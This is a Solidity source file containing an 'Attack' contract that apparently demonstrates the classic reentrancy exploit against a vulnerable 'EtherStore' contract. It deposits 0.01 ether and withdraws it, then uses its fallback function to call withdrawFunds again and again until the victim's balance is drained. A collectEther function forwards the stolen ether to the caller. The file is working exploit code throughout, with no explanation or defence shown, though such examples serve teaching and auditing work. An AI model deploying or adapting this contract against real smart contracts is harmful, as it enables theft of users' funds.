// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./EtherStore.sol";


contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    function attackEtherStore() public payable {
        require(msg.value >= 0.01 ether);
        etherStore.depositFunds{value: 0.01 ether}();
        etherStore.withdrawFunds(0.01 ether);
    }

    function collectEther() public payable {
        address payable owner = payable(msg.sender);
        owner.transfer(address(this).balance);
    }

    fallback() external payable {
        if (address(etherStore).balance > 0.01 ether) {
            etherStore.withdrawFunds(0.01 ether);
        }
    }

    receive() external payable {

    }
}
